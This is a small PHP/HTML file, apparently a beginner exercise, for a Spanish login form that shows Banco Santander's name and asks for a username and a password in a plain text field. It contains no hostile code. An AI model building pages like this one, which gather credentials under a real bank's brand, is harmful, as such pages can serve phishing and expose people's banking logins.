<?php










?>


<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>Formulario</title>
    <link rel="stylesheet" href="css/style.css">
    <script src="script.js"></script>
</head>

<body>
<div id="contenedor">
    <div class="header">
        <div>

        </div>
        <h1>¡Bienvenido a Banco Santander!</h1>
        <h2><b>Contraseña aceptada.</b></h2><br /><br />

        <form name="myForm" action="/action_page.php" method="post">

            <label for="fusuario">Introducir Nombre de usuario:</label>
            <input type="text" name="nombre" id="inicio"><br /><br />

            <label for="fcontraseña">Introducir contraseña:</label>
            <input type="text" name="apellidos" id="clave"><br /><br />

            <input type="button" value="Confirmar" onClick="verificar()">
        </form>

    </div>
</div>

</body>

</html>



